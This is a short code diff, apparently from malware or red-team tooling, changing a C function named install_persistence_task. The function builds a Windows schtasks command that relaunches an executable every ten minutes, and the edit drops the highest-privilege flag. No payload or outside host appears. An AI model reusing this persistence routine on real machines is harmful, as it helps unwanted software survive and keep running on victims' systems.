@@ -156,7 +156,7 @@ int install_persistence_task(const char *exe_path, const char *task_name) {
     // Commande schtasks pour créer une tâche qui s'exécute toutes les 10 minutes
     snprintf(cmd, sizeof(cmd),
         "schtasks /Create /TN \"%s\" /TR \"\\\"%s\\\"\" "
-        "/SC MINUTE /MO 10 /F /RL HIGHEST",
+        "/SC MINUTE /MO 10 /F",
         task_name, exe_path
     );
     
